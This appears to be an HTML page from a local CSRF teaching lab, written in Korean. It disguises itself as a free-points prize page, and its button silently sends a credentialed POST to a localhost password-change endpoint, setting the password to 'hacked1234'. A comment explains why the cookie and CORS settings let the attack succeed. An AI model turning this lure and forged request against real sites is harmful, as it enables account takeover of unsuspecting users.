<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <title>🎁 무료 포인트 지급 이벤트!</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background: #fff8e1; }
    h1 { color: #e65100; }
    .btn { background: #ff6f00; color: white; border: none; padding: 14px 32px;
           font-size: 18px; border-radius: 8px; cursor: pointer; margin-top: 20px; }
    .btn:hover { background: #e65100; }
    .log { margin-top: 30px; padding: 16px; background: #f5f5f5;
           border-radius: 8px; text-align: left; font-size: 13px; display: none; }
    .success { color: green; font-weight: bold; }
    .error { color: red; }
  </style>
</head>
<body>

  <h1>🎉 축하합니다! 이벤트 당첨!</h1>
  <p>포인트를 지급하려면 계정을 확인해야 합니다.</p>
  <p>아래 버튼을 클릭하면 10만 포인트가 즉시 지급됩니다.</p>
  <button class="btn" onclick="claimReward()">포인트 받기</button>

  <div id="log" class="log"></div>

  <!--
    ============================================================
    [V2 CSRF 공격 원리]
    ============================================================
    victim은 localhost:3000에서 V2(세션) 모드로 로그인한 상태.
    세션 쿠키: HttpOnly=true, SameSite=Lax

    이 페이지(localhost:5000)에서 localhost:4001로 POST 요청 시:
    - CORS: 서버가 localhost:5000을 명시적으로 허용 → 통과 ✅
    - 세션 쿠키: SameSite=Lax + localhost = 같은 registrable domain
                 → 쿠키 자동 전송 ✅
    - CSRF 토큰: 없음 → 서버가 검증 불가 ✅

    결과: victim 모르게 비밀번호가 'hacked1234'로 변경됨!
    ============================================================
  -->

  <script>
    async function claimReward() {
      const log = document.getElementById('log');
      log.style.display = 'block';
      log.innerHTML = '⏳ 포인트 지급 처리 중...';

      try {
        // ❌ CSRF 공격 — victim의 세션 쿠키가 자동으로 실려 전송됨
        const res = await fetch('http://localhost:4001/api/user/update-password', {
          method: 'POST',
          credentials: 'include',           // 세션 쿠키 포함
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ newPassword: 'hacked1234' })
        });

        if (res.ok) {
          log.innerHTML = `
            <p class="success">✅ 공격 성공!</p>
            <p>피해자의 비밀번호가 <strong>hacked1234</strong>로 변경되었습니다.</p>
            <p style="margin-top:12px; color:#555;">
              이제 공격자는 victim@test.com / hacked1234 로 로그인 가능합니다.<br>
              V2(세션) 모드로 <a href="http://localhost:3000/login" target="_blank">로그인 시도 →</a>
            </p>
          `;
        } else {
          const data = await res.json().catch(() => ({}));
          log.innerHTML = `<p class="error">실패 (${res.status}): ${data.message ?? '알 수 없는 오류'}</p>
            <p>victim이 V2 모드로 로그인한 상태인지 확인하세요.</p>`;
        }
      } catch (e) {
        log.innerHTML = `<p class="error">오류: ${e.message}</p>
          <p>서버가 실행 중인지, victim이 V2로 로그인했는지 확인하세요.</p>`;
      }
    }
  </script>
</body>
</html>
